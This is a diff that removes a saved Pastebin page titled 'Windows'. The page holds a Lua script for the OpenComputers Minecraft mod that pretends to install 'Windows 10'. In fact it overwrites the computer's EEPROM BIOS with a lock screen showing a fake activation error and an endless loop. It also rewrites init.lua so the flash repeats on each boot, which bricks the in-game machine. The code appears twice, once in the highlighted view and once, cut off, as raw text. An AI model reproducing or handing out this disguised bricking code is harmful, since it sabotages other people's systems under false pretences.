@@ -1,649 +1,0 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-58643-34"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', "UA-58643-34");
-    </script>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <title>Windows - Pastebin.com</title>
-    <link rel="shortcut icon" href="/favicon.ico" />
-    <meta name="description" content="Pastebin.com is the number one paste tool since 2002. Pastebin is a website where you can store text online for a set period of time." />
-    <meta property="og:description" content="Pastebin.com is the number one paste tool since 2002. Pastebin is a website where you can store text online for a set period of time." />
-    <meta name="robots" content="noindex" />
-        <meta property="fb:app_id" content="231493360234820" />
-    <meta property="og:title" content="Windows - Pastebin.com" />
-    <meta property="og:type" content="article" />
-    <meta property="og:url" content="https://pastebin.com/5ubvJ9rs" />
-    <meta property="og:image" content="https://pastebin.com/i/facebook.png" />
-    <meta property="og:site_name" content="Pastebin" />
-    <meta name="google-site-verification" content="jkUAIOE8owUXu8UXIhRLB9oHJsWBfOgJbZzncqHoF4A" />
-    <link rel="canonical" href="https://pastebin.com/5ubvJ9rs" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-        <meta name="csrf-param" content="_csrf-frontend">
-<meta name="csrf-token" content="snfK49g80AuP4udC-Hg3RMC8Ao23wbRhblk2PtMZ7K7hArutkmmWfePRlDuXQW40q-tr2vuzhytdL0VuoHGd6Q==">
-
-<link href="/assets/c80611c4/css/bootstrap.min.css" rel="stylesheet">        
-<link href="/themes/pastebin/css/vendors.bundle.css?ec0a0b6023b5e6c9982d" rel="stylesheet">
-<link href="/themes/pastebin/css/app.bundle.css?ec0a0b6023b5e6c9982d" rel="stylesheet">
-    </head>
-<body class="night-auto " data-pr="" data-pa="" data-sar="1" data-abd="1">
-
-
-<div class="wrap">
-
-        
-        
-<div class="header">
-    <div class="container">
-        <div class="header__container">
-
-                        <div class="header__left">
-                <a class="header__logo" href="/">
-                    Pastebin                </a>
-
-                <div class="header__links h_1024">
-                    
-                    <a href="/doc_api">API</a>
-                    <a href="/tools">tools</a>
-                    <a href="/faq">faq</a>
-                                    </div>
-
-                
-                <a class="header__btn" href="/">
-                    paste                </a>
-            </div>
-
-                        <div class="header__right">
-
-                                    <div class="header_sign">
-                        <a href="/login" class="btn-sign sign-in">Login</a>
-                        <a href="/signup" class="btn-sign sign-up">Sign up</a>
-                    </div>
-                
-            </div>
-
-        </div>
-    </div>
-
-</div>
-        
-
-    <div class="container">
-        <div class="content">
-
-                        
-                                    
-            
-            
-<link href="/themes/pastebin/css/geshi/light/text.css?694707f98000ed24d865" rel="stylesheet">
-
-<div class="post-view">
-
-    
-    <div class="details">
-                    <div class="share h_800">
-                <div data-url="https://pastebin.com/5ubvJ9rs" class="share-btn facebook js-facebook-share" title="Share on Facebook!"><span>SHARE</span></div>
-                <div data-url="https://pastebin.com/5ubvJ9rs" class="share-btn twitter js-twitter-share" title="Share on Twitter!"><span>TWEET</span></div>
-            </div>
-                <div class="user-icon">
-                            <img src="/themes/pastebin/img/guest.png" alt="CACKE228">                    </div>
-        <div class="info-bar">
-            <div class="info-top">
-
-                
-                
-                <h1>Windows</h1>
-            </div>
-            <div class="info-bottom">
-
-                                    <div class="username">
-                                                    <a href="/u/CACKE228">CACKE228</a>
-                                            </div>
-
-                    
-                                             <a href="/message/compose?to=CACKE228" class="message" title="Send a private message to: CACKE228"></a>
-                                    
-                <div class="date">
-                    <span title="Wednesday 14th of July 2021 02:34:18 PM CDT">Jul 14th, 2021</span>
-
-                                            (<span title="Last edit on: Wednesday 14th of July 2021 02:48:42 PM CDT">edited</span>)
-                                    </div>
-
-                <div class="visits" title="Unique visits to this paste">
-                    542                </div>
-
-                <div class="expire" title="When this paste gets automatically deleted">
-                    Never                </div>
-            </div>
-        </div>
-    </div>
-
-                        <div class="page">
-                <div class="content__text -no-padding">
-                    <div class="notice -post-view">
-                        <b>Not a member of Pastebin yet?</b>
-                        <a href="/signup"><b><u>Sign Up</u></b></a>,
-                        it unlocks many cool features!                    </div>
-                </div>
-            </div>
-        
-    
-    <div class="highlighted-code">
-        <div class="top-buttons">
-            <div class="left">
-                <a href="/archive/text" class="btn -small h_800">text</a> 8.63 KB            </div>
-
-            <div class="right">
-                                    <a href="/raw/5ubvJ9rs" class="btn -small">raw</a>
-                    <a href="/dl/5ubvJ9rs" class="btn -small">download</a>
-                    <a href="/clone/5ubvJ9rs" class="btn -small h_800">clone</a>
-                    <a href="/embed/5ubvJ9rs" class="btn -small h_800">embed</a>
-                    <a href="/print/5ubvJ9rs" class="btn -small h_800">print</a>
-                
-                                    <a href="/report/5ubvJ9rs" class="btn -small">report</a>
-                
-                
-                            </div>
-        </div>
-        <div class="source" style="font-size: px; line-height: px;">
-            <ol class="text"><li class="li1"><div class="de1">local virusPath = &quot;bin/virus.lua&quot;</div></li><li class="li1"><div class="de1">local EEPROMLabel = &quot;EEPROM (Lua BIOS)&quot;</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">------------------------------------------------------------------------------------------------------------------------</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">local EEPROMCode = [[</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">local textLines = {</div></li><li class="li1"><div class="de1">  &quot;:(!&quot;,</div></li><li class="li1"><div class="de1">  &quot;Возникла Ошибка с активацией.&quot;,</div></li><li class="li1"><div class="de1">  &quot;Попробуй рестартнуть. &quot;,</div></li><li class="li1"><div class="de1">  &quot;если не работает то хз.&quot;,</div></li><li class="li1"><div class="de1">  &quot; &quot;,</div></li><li class="li1"><div class="de1">  &quot;Хех)&quot;,</div></li><li class="li1"><div class="de1">}</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">local component_invoke = component.invoke</div></li><li class="li1"><div class="de1">function boot_invoke(address, method, ...)</div></li><li class="li1"><div class="de1">  local result = table.pack(pcall(component_invoke, address, method, ...))</div></li><li class="li1"><div class="de1">  if not result[1] then</div></li><li class="li1"><div class="de1">    return nil, result[2]</div></li><li class="li1"><div class="de1">  else</div></li><li class="li1"><div class="de1">    return table.unpack(result, 2, result.n)</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">end</div></li><li class="li1"><div class="de1">---------------------------------------------------------------</div></li><li class="li1"><div class="de1">local eeprom = component.list(&quot;eeprom&quot;)()</div></li><li class="li1"><div class="de1">computer.getBootAddress = function()</div></li><li class="li1"><div class="de1">  return boot_invoke(eeprom, &quot;getData&quot;)</div></li><li class="li1"><div class="de1">end</div></li><li class="li1"><div class="de1">computer.setBootAddress = function(address)</div></li><li class="li1"><div class="de1">  return boot_invoke(eeprom, &quot;setData&quot;, address)</div></li><li class="li1"><div class="de1">end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">do</div></li><li class="li1"><div class="de1">  _G.screen = component.list(&quot;screen&quot;)()</div></li><li class="li1"><div class="de1">  _G.gpu = component.list(&quot;gpu&quot;)()</div></li><li class="li1"><div class="de1">  if gpu and screen then</div></li><li class="li1"><div class="de1">    boot_invoke(gpu, &quot;bind&quot;, screen)</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">end</div></li><li class="li1"><div class="de1">---------------------------------------------------------------</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">local function centerText(mode,coord,text)</div></li><li class="li1"><div class="de1">  local dlina = unicode.len(text)</div></li><li class="li1"><div class="de1">  local xSize,ySize = boot_invoke(gpu, &quot;getResolution&quot;)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  if mode == &quot;x&quot; then</div></li><li class="li1"><div class="de1">    boot_invoke(gpu, &quot;set&quot;, math.floor(xSize/2-dlina/2),coord,text)</div></li><li class="li1"><div class="de1">  elseif mode == &quot;y&quot; then</div></li><li class="li1"><div class="de1">    boot_invoke(gpu, &quot;set&quot;, coord, math.floor(ySize/2),text)</div></li><li class="li1"><div class="de1">  else</div></li><li class="li1"><div class="de1">    boot_invoke(gpu, &quot;set&quot;, math.floor(xSize/2-dlina/2),math.floor(ySize/2),text)</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">local function virus()</div></li><li class="li1"><div class="de1">  local background, foreground = 0x0000AA, 0xCCCCCC</div></li><li class="li1"><div class="de1">  local xSize, ySize = boot_invoke(gpu, &quot;getResolution&quot;)</div></li><li class="li1"><div class="de1">  boot_invoke(gpu, &quot;setBackground&quot;, background)</div></li><li class="li1"><div class="de1">  boot_invoke(gpu, &quot;fill&quot;, 1, 1, xSize, ySize, &quot; &quot;)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  boot_invoke(gpu, &quot;setBackground&quot;, foreground)</div></li><li class="li1"><div class="de1">  boot_invoke(gpu, &quot;setForeground&quot;, background)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  local y = math.floor(ySize / 2 - (#textLines + 2) / 2)</div></li><li class="li1"><div class="de1">  centerText(&quot;x&quot;, y, &quot; Windows 10! &quot;)</div></li><li class="li1"><div class="de1">  y = y + 2</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  boot_invoke(gpu, &quot;setBackground&quot;, background)</div></li><li class="li1"><div class="de1">  boot_invoke(gpu, &quot;setForeground&quot;, foreground)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  for i = 1, #textLines do</div></li><li class="li1"><div class="de1">    centerText(&quot;x&quot;, y, textLines[i])</div></li><li class="li1"><div class="de1">    y = y + 1</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  while true do</div></li><li class="li1"><div class="de1">    computer.pullSignal()</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">if gpu then virus() end</div></li><li class="li1"><div class="de1">]]</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">local INITCode = [[</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">local backgroundColor = 0x262626</div></li><li class="li1"><div class="de1">local foregroundColor = 0xcccccc</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">do</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  _G._OSVERSION = &quot;OpenOS 1.5&quot;</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  local component = component</div></li><li class="li1"><div class="de1">  local computer = computer</div></li><li class="li1"><div class="de1">  local unicode = unicode</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  -- Runlevel information.</div></li><li class="li1"><div class="de1">  local runlevel, shutdown = &quot;S&quot;, computer.shutdown</div></li><li class="li1"><div class="de1">  computer.runlevel = function() return runlevel end</div></li><li class="li1"><div class="de1">  computer.shutdown = function(reboot)</div></li><li class="li1"><div class="de1">    runlevel = reboot and 6 or 0</div></li><li class="li1"><div class="de1">    if os.sleep then</div></li><li class="li1"><div class="de1">      computer.pushSignal(&quot;shutdown&quot;)</div></li><li class="li1"><div class="de1">      os.sleep(0.1) -- Allow shutdown processing.</div></li><li class="li1"><div class="de1">    end</div></li><li class="li1"><div class="de1">    shutdown(reboot)</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  -- Low level dofile implementation to read filesystem libraries.</div></li><li class="li1"><div class="de1">  local rom = {}</div></li><li class="li1"><div class="de1">  function rom.invoke(method, ...)</div></li><li class="li1"><div class="de1">    return component.invoke(computer.getBootAddress(), method, ...)</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">  function rom.open(file) return rom.invoke(&quot;open&quot;, file) end</div></li><li class="li1"><div class="de1">  function rom.read(handle) return rom.invoke(&quot;read&quot;, handle, math.huge) end</div></li><li class="li1"><div class="de1">  function rom.close(handle) return rom.invoke(&quot;close&quot;, handle) end</div></li><li class="li1"><div class="de1">  function rom.inits() return ipairs(rom.invoke(&quot;list&quot;, &quot;boot&quot;)) end</div></li><li class="li1"><div class="de1">  function rom.isDirectory(path) return rom.invoke(&quot;isDirectory&quot;, path) end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  local screen = component.list(&#039;screen&#039;,true)()</div></li><li class="li1"><div class="de1">  for address in component.list(&#039;screen&#039;,true) do</div></li><li class="li1"><div class="de1">    if #component.invoke(address, &#039;getKeyboards&#039;) &gt; 0 then</div></li><li class="li1"><div class="de1">      screen = address</div></li><li class="li1"><div class="de1">    end</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  -- Report boot progress if possible.</div></li><li class="li1"><div class="de1">  local gpu = component.list(&quot;gpu&quot;, true)()</div></li><li class="li1"><div class="de1">  local w, h</div></li><li class="li1"><div class="de1">  if gpu and screen then</div></li><li class="li1"><div class="de1">    component.invoke(gpu, &quot;bind&quot;, screen)</div></li><li class="li1"><div class="de1">    w, h = component.invoke(gpu, &quot;getResolution&quot;)</div></li><li class="li1"><div class="de1">    component.invoke(gpu, &quot;setResolution&quot;, w, h)</div></li><li class="li1"><div class="de1">    component.invoke(gpu, &quot;setBackground&quot;, backgroundColor)</div></li><li class="li1"><div class="de1">    component.invoke(gpu, &quot;setForeground&quot;, foregroundColor)</div></li><li class="li1"><div class="de1">    component.invoke(gpu, &quot;fill&quot;, 1, 1, w, h, &quot; &quot;)</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">  local y = 1</div></li><li class="li1"><div class="de1">  local function status(msg)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">    local yPos = math.floor(h / 2)</div></li><li class="li1"><div class="de1">    local length = #msg</div></li><li class="li1"><div class="de1">    local xPos = math.floor(w / 2 - length / 2)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">    component.invoke(gpu, &quot;fill&quot;, 1, yPos, w, 1, &quot; &quot;)</div></li><li class="li1"><div class="de1">    component.invoke(gpu, &quot;set&quot;, xPos, yPos, msg)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">    -- if gpu and screen then</div></li><li class="li1"><div class="de1">    --   component.invoke(gpu, &quot;set&quot;, 1, y, msg)</div></li><li class="li1"><div class="de1">    --   if y == h then</div></li><li class="li1"><div class="de1">    --     component.invoke(gpu, &quot;copy&quot;, 1, 2, w, h - 1, 0, -1)</div></li><li class="li1"><div class="de1">    --     component.invoke(gpu, &quot;fill&quot;, 1, h, w, 1, &quot; &quot;)</div></li><li class="li1"><div class="de1">    --   else</div></li><li class="li1"><div class="de1">    --     y = y + 1</div></li><li class="li1"><div class="de1">    --   end</div></li><li class="li1"><div class="de1">    -- end</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  status(&quot;Booting &quot; .. _OSVERSION .. &quot;...&quot;)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  -- Custom low-level loadfile/dofile implementation reading from our ROM.</div></li><li class="li1"><div class="de1">  local function loadfile(file)</div></li><li class="li1"><div class="de1">    status(&quot;&gt; &quot; .. file)</div></li><li class="li1"><div class="de1">    local handle, reason = rom.open(file)</div></li><li class="li1"><div class="de1">    if not handle then</div></li><li class="li1"><div class="de1">      error(reason)</div></li><li class="li1"><div class="de1">    end</div></li><li class="li1"><div class="de1">    local buffer = &quot;&quot;</div></li><li class="li1"><div class="de1">    repeat</div></li><li class="li1"><div class="de1">      local data, reason = rom.read(handle)</div></li><li class="li1"><div class="de1">      if not data and reason then</div></li><li class="li1"><div class="de1">        error(reason)</div></li><li class="li1"><div class="de1">      end</div></li><li class="li1"><div class="de1">      buffer = buffer .. (data or &quot;&quot;)</div></li><li class="li1"><div class="de1">    until not data</div></li><li class="li1"><div class="de1">    rom.close(handle)</div></li><li class="li1"><div class="de1">    return load(buffer, &quot;=&quot; .. file)</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  local function dofile(file)</div></li><li class="li1"><div class="de1">    local program, reason = loadfile(file)</div></li><li class="li1"><div class="de1">    if program then</div></li><li class="li1"><div class="de1">      local result = table.pack(pcall(program))</div></li><li class="li1"><div class="de1">      if result[1] then</div></li><li class="li1"><div class="de1">        return table.unpack(result, 2, result.n)</div></li><li class="li1"><div class="de1">      else</div></li><li class="li1"><div class="de1">        error(result[2])</div></li><li class="li1"><div class="de1">      end</div></li><li class="li1"><div class="de1">    else</div></li><li class="li1"><div class="de1">      error(reason)</div></li><li class="li1"><div class="de1">    end</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  status(&quot;Initializing package management...&quot;)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  -- Load file system related libraries we need to load other stuff moree</div></li><li class="li1"><div class="de1">  -- comfortably. This is basically wrapper stuff for the file streams</div></li><li class="li1"><div class="de1">  -- provided by the filesystem components.</div></li><li class="li1"><div class="de1">  local package = dofile(&quot;/lib/package.lua&quot;)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  do</div></li><li class="li1"><div class="de1">    -- Unclutter global namespace now that we have the package module.</div></li><li class="li1"><div class="de1">    --_G.component = nil</div></li><li class="li1"><div class="de1">    _G.computer = nil</div></li><li class="li1"><div class="de1">    _G.process = nil</div></li><li class="li1"><div class="de1">    _G.unicode = nil</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">    -- Initialize the package module with some of our own APIs.</div></li><li class="li1"><div class="de1">    package.preload[&quot;buffer&quot;] = loadfile(&quot;/lib/buffer.lua&quot;)</div></li><li class="li1"><div class="de1">    package.preload[&quot;component&quot;] = function() return component end</div></li><li class="li1"><div class="de1">    package.preload[&quot;computer&quot;] = function() return computer end</div></li><li class="li1"><div class="de1">    package.preload[&quot;filesystem&quot;] = loadfile(&quot;/lib/filesystem.lua&quot;)</div></li><li class="li1"><div class="de1">    package.preload[&quot;io&quot;] = loadfile(&quot;/lib/io.lua&quot;)</div></li><li class="li1"><div class="de1">    package.preload[&quot;unicode&quot;] = function() return unicode end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">    -- Inject the package and io modules into the global namespace, as in Lua.</div></li><li class="li1"><div class="de1">    _G.package = package</div></li><li class="li1"><div class="de1">    _G.io = require(&quot;io&quot;)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  status(&quot;Initializing file system...&quot;)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  -- Mount the ROM and temporary file systems to allow working on the file</div></li><li class="li1"><div class="de1">  -- system module from this point on.</div></li><li class="li1"><div class="de1">  local filesystem = require(&quot;filesystem&quot;)</div></li><li class="li1"><div class="de1">  filesystem.mount(computer.getBootAddress(), &quot;/&quot;)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  status(&quot;Running boot scripts...&quot;)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  -- Run library startup scripts. These mostly initialize event handlers.</div></li><li class="li1"><div class="de1">  local scripts = {}</div></li><li class="li1"><div class="de1">  for _, file in rom.inits() do</div></li><li class="li1"><div class="de1">    local path = &quot;boot/&quot; .. file</div></li><li class="li1"><div class="de1">    if not rom.isDirectory(path) then</div></li><li class="li1"><div class="de1">      table.insert(scripts, path)</div></li><li class="li1"><div class="de1">    end</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">  table.sort(scripts)</div></li><li class="li1"><div class="de1">  for i = 1, #scripts do</div></li><li class="li1"><div class="de1">    dofile(scripts[i])</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  status(&quot;Initializing components...&quot;)</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">  local primaries = {}</div></li><li class="li1"><div class="de1">  for c, t in component.list() do</div></li><li class="li1"><div class="de1">    local s = component.slot(c)</div></li><li class="li1"><div class="de1">    if (not primaries[t] or (s &gt;= 0 and s &lt; primaries[t].slot)) and t ~= &quot;screen&quot; then</div></li><li class="li1"><div class="de1">      primaries[t] = {address=c, slot=s}</div></li><li class="li1"><div class="de1">    end</div></li><li class="li1"><div class="de1">    computer.pushSignal(&quot;component_added&quot;, c, t)</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">  for t, c in pairs(primaries) do</div></li><li class="li1"><div class="de1">    component.setPrimary(t, c.address)</div></li><li class="li1"><div class="de1">  end</div></li><li class="li1"><div class="de1">  os.sleep(0.5) -- Allow signal processing by libraries.</div></li><li class="li1"><div class="de1">  --computer.pushSignal(&quot;init&quot;) -- so libs know components are initialized.</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1"> -- status(&quot;Initializing system...&quot;)</div></li><li class="li1"><div class="de1">  --require(&quot;term&quot;).clear()</div></li><li class="li1"><div class="de1">  os.sleep(0.1) -- Allow init processing.</div></li><li class="li1"><div class="de1">  runlevel = 1</div></li><li class="li1"><div class="de1">end</div></li><li class="li1"><div class="de1">]]</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">local component = require(&quot;component&quot;)</div></li><li class="li1"><div class="de1">local args = { ... }</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">local function flashEEPROM()</div></li><li class="li1"><div class="de1">  local eeprom = component.getPrimary(&quot;eeprom&quot;)</div></li><li class="li1"><div class="de1">  eeprom.set(EEPROMCode)</div></li><li class="li1"><div class="de1">  eeprom.setLabel(EEPROMLabel)</div></li><li class="li1"><div class="de1">end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">local function rewriteInit()</div></li><li class="li1"><div class="de1">  local file = io.open(&quot;init.lua&quot;, &quot;w&quot;)</div></li><li class="li1"><div class="de1">  file:write(INITCode, &quot;\n&quot;, &quot;\n&quot;)</div></li><li class="li1"><div class="de1">  file:write(&quot;pcall(loadfile(\&quot;&quot; .. virusPath .. &quot;\&quot;), \&quot;flashEEPROM\&quot;)&quot;, &quot;\n&quot;, &quot;\n&quot;)</div></li><li class="li1"><div class="de1">  file:write(&quot;require(\&quot;computer\&quot;).shutdown(true)&quot;)</div></li><li class="li1"><div class="de1">  file:close()</div></li><li class="li1"><div class="de1">end</div></li><li class="li1"><div class="de1">&nbsp;</div></li><li class="li1"><div class="de1">if args[1] == &quot;flashEEPROM&quot; then</div></li><li class="li1"><div class="de1">  flashEEPROM()</div></li><li class="li1"><div class="de1">else</div></li><li class="li1"><div class="de1">  print(&quot;копирование файлов&quot;)</div></li><li class="li1"><div class="de1">  print(&quot;Установка Windows 10...&quot;)</div></li><li class="li1"><div class="de1">  flashEEPROM()</div></li><li class="li1"><div class="de1">  print(&quot;прошивка биоса...&quot;)</div></li><li class="li1"><div class="de1">  rewriteInit()</div></li><li class="li1"><div class="de1">  print(&quot;почти готово &quot;)</div></li><li class="li1"><div class="de1">  print(&quot;ошибка установки!&quot;)</div></li><li class="li1"><div class="de1">  print(&quot;рестартни &quot;)</div></li><li class="li1"><div class="de1">end</div></li></ol>        </div>
-    </div>
-
-    
-                
-        <div class="content__title -no-border">
-            RAW Paste Data        </div>
-
-        <textarea class="textarea">local virusPath = &quot;bin/virus.lua&quot;
-local EEPROMLabel = &quot;EEPROM (Lua BIOS)&quot;
-
-------------------------------------------------------------------------------------------------------------------------
-
-local EEPROMCode = [[
-
-local textLines = {
-  &quot;:(!&quot;,
-  &quot;Возникла Ошибка с активацией.&quot;,
-  &quot;Попробуй рестартнуть. &quot;,
-  &quot;если не работает то хз.&quot;,
-  &quot; &quot;,
-  &quot;Хех)&quot;,
-}
-
-local component_invoke = component.invoke
-function boot_invoke(address, method, ...)
-  local result = table.pack(pcall(component_invoke, address, method, ...))
-  if not result[1] then
-    return nil, result[2]
-  else
-    return table.unpack(result, 2, result.n)
-  end
-end
----------------------------------------------------------------
-local eeprom = component.list(&quot;eeprom&quot;)()
-computer.getBootAddress = function()
-  return boot_invoke(eeprom, &quot;getData&quot;)
-end
-computer.setBootAddress = function(address)
-  return boot_invoke(eeprom, &quot;setData&quot;, address)
-end
-
-do
-  _G.screen = component.list(&quot;screen&quot;)()
-  _G.gpu = component.list(&quot;gpu&quot;)()
-  if gpu and screen then
-    boot_invoke(gpu, &quot;bind&quot;, screen)
-  end
-end
----------------------------------------------------------------
-
-local function centerText(mode,coord,text)
-  local dlina = unicode.len(text)
-  local xSize,ySize = boot_invoke(gpu, &quot;getResolution&quot;)
-
-  if mode == &quot;x&quot; then
-    boot_invoke(gpu, &quot;set&quot;, math.floor(xSize/2-dlina/2),coord,text)
-  elseif mode == &quot;y&quot; then
-    boot_invoke(gpu, &quot;set&quot;, coord, math.floor(ySize/2),text)
-  else
-    boot_invoke(gpu, &quot;set&quot;, math.floor(xSize/2-dlina/2),math.floor(ySize/2),text)
-  end
-end
-
-local function virus()
-  local background, foreground = 0x0000AA, 0xCCCCCC
-  local xSize, ySize = boot_invoke(gpu, &quot;getResolution&quot;)
-  boot_invoke(gpu, &quot;setBackground&quot;, background)
-  boot_invoke(gpu, &quot;fill&quot;, 1, 1, xSize, ySize, &quot; &quot;)
-
-  boot_invoke(gpu, &quot;setBackground&quot;, foreground)
-  boot_invoke(gpu, &quot;setForeground&quot;, background)
-
-  local y = math.floor(ySize / 2 - (#textLines + 2) / 2)
-  centerText(&quot;x&quot;, y, &quot; Windows 10! &quot;)
-  y = y + 2
-
-  boot_invoke(gpu, &quot;setBackground&quot;, background)
-  boot_invoke(gpu, &quot;setForeground&quot;, foreground)
-
-  for i = 1, #textLines do
-    centerText(&quot;x&quot;, y, textLines[i])
-    y = y + 1
-  end
-
-  while true do
-    computer.pullSignal()
-  end
-end
-
-if gpu then virus() end
-]]
-
-local INITCode = [[
-
-local backgroundColor = 0x262626
-local foregroundColor = 0xcccccc
-
-do
-  
-  _G._OSVERSION = &quot;OpenOS 1.5&quot;
-
-  local component = component
-  local computer = computer
-  local unicode = unicode
-
-  -- Runlevel information.
-  local runlevel, shutdown = &quot;S&quot;, computer.shutdown
-  computer.runlevel = function() return runlevel end
-  computer.shutdown = function(reboot)
-    runlevel = reboot and 6 or 0
-    if os.sleep then
-      computer.pushSignal(&quot;shutdown&quot;)
-      os.sleep(0.1) -- Allow shutdown processing.
-    end
-    shutdown(reboot)
-  end
-
-  -- Low level dofile implementation to read filesystem libraries.
-  local rom = {}
-  function rom.invoke(method, ...)
-    return component.invoke(computer.getBootAddress(), method, ...)
-  end
-  function rom.open(file) return rom.invoke(&quot;open&quot;, file) end
-  function rom.read(handle) return rom.invoke(&quot;read&quot;, handle, math.huge) end
-  function rom.close(handle) return rom.invoke(&quot;close&quot;, handle) end
-  function rom.inits() return ipairs(rom.invoke(&quot;list&quot;, &quot;boot&quot;)) end
-  function rom.isDirectory(path) return rom.invoke(&quot;isDirectory&quot;, path) end
-
-  local screen = component.list(&#039;screen&#039;,true)()
-  for address in component.list(&#039;screen&#039;,true) do
-    if #component.invoke(address, &#039;getKeyboards&#039;) &gt; 0 then
-      screen = address
-    end
-  end
-
-  -- Report boot progress if possible.
-  local gpu = component.list(&quot;gpu&quot;, true)()
-  local w, h
-  if gpu and screen then
-    component.invoke(gpu, &quot;bind&quot;, screen)
-    w, h = component.invoke(gpu, &quot;getResolution&quot;)
-    component.invoke(gpu, &quot;setResolution&quot;, w, h)
-    component.invoke(gpu, &quot;setBackground&quot;, backgroundColor)
-    component.invoke(gpu, &quot;setForeground&quot;, foregroundColor)
-    component.invoke(gpu, &quot;fill&quot;, 1, 1, w, h, &quot; &quot;)
-  end
-  local y = 1
-  local function status(msg)
-
-
-    local yPos = math.floor(h / 2)
-    local length = #msg
-    local xPos = math.floor(w / 2 - length / 2)
-
-    component.invoke(gpu, &quot;fill&quot;, 1, yPos, w, 1, &quot; &quot;)
-    component.invoke(gpu, &quot;set&quot;, xPos, yPos, msg)
-
-    -- if gpu and screen then
-    --   component.invoke(gpu, &quot;set&quot;, 1, y, msg)
-    --   if y == h then
-    --     component.invoke(gpu, &quot;copy&quot;, 1, 2, w, h - 1, 0, -1)
-    --     component.invoke(gpu, &quot;fill&quot;, 1, h, w, 1, &quot; &quot;)
-    --   else
-    --     y = y + 1
-    --   end
-    -- end
-  end
-
-  status(&quot;Booting &quot; .. _OSVERSION .. &quot;...&quot;)
-
-  -- Custom low-level loadfile/dofile implementation reading from our ROM.
-  local function loadfile(file)
-    status(&quot;&gt; &quot; .. file)
-    local handle, reason = rom.open(file)
-    if not handle then
-      error(reason)
-    end
-    local buffer = &quot;&quot;
-    repeat
-      local data, reason = rom.read(handle)
-      if not data and reason then
-        error(reason)
-      end
-      buffer = buffer .. (data or &quot;&quot;)
-    until not data
-    rom.close(handle)
